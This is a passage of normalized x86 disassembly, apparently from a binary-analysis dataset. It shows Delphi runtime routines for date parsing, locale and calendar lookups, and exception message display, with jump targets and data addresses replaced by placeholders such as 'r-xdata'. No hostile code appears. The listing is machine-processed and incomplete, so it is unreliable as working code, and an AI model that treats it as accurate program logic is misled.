pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4089d0
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089d0
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
jmp r-xdata
sub_40a754
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409fa0
pop ecx
push ebp
mov eax ebx
call sub_409fa0
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40405c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a7c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a7e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a7c4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40422c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a87c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a8f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a8fc
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a7c4
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40422c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40448c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4080d0
test eax eax
jne r-xdata
mov eax edi
call sub_40422c
add [ esi ] eax
mov bl 0x1
sub_40a908
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a7c4
mov eax esi
call sub_40422c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a940
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40422c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a98c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c534
mov [ ebx ] eax
jmp r-xdata
sub_40a9d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40442c
push eax
mov eax [ ebx ]
call sub_40442c
pop edx
call sub_40c634
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40aa28
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409bc8
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40aa84
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ad9f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a940
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c570
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a7e8
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a98c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40448c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408140
mov eax [ ebp - 0x1c ]
call sub_40a9d4
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ada6
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f90
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a908
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a7e8
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a908
test al al
je r-xdata
call sub_409bc8
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a7e8
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_40993c
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404570
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a908
mov edx ebx
mov eax esi
call sub_40a7c4
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a98c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40aa28
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a7c4
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409bc8
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40422c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40448c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4080d0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40422c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40448c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4080d0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40adc8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a87c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a87c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a87c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a7e8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a7c4
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a87c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a908
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a7e8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a87c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a908
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a7c4
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4097f4
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a87c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a7e8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a87c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a908
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a87c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a7e8
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40afbc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aa84
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40422c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aff0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40adc8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40422c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b024
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40aa84
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40aff0
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40adc8
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b0b0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40405c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b0fc
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fc0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40405c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b148
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b170
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b0fc
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405e60
sub_40b1ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b2bf
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b170
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fc0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b170
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fc0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b170
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fc0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b170
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fc0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b2c6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f90
retn
sub_40b2d0
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404164
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b30c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b371
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404164
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4083b8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b378
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
inc ebx
sub_40b384
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b41b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b0fc
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4083b8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b422
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b2d0
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b30c
call EnumCalendarInfoA
sub_40b434
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b5fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f6c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b0fc
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4083b8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b605
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f90
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4089d0
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c4f8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40448c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404234
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4089d0
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
inc ebx
jmp r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4089d0
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404154
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404234
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404154
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404234
sub_40b668
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b65c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c6d4
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4088f4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4053cc
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_40316c
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408f18
mov eax [ ebp - 0x4 ]
call sub_408890
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40442c
mov ebx eax
mov eax ebx
call sub_408890
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b7f0
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b668
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4053cc
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a80
call sub_4028f4
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408890
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b8c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fc0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b900
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b95a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408f58
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b961
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add esp 0xfffffff0
call sub_403540
sub_40b961
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b980
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405e60
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b9bc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
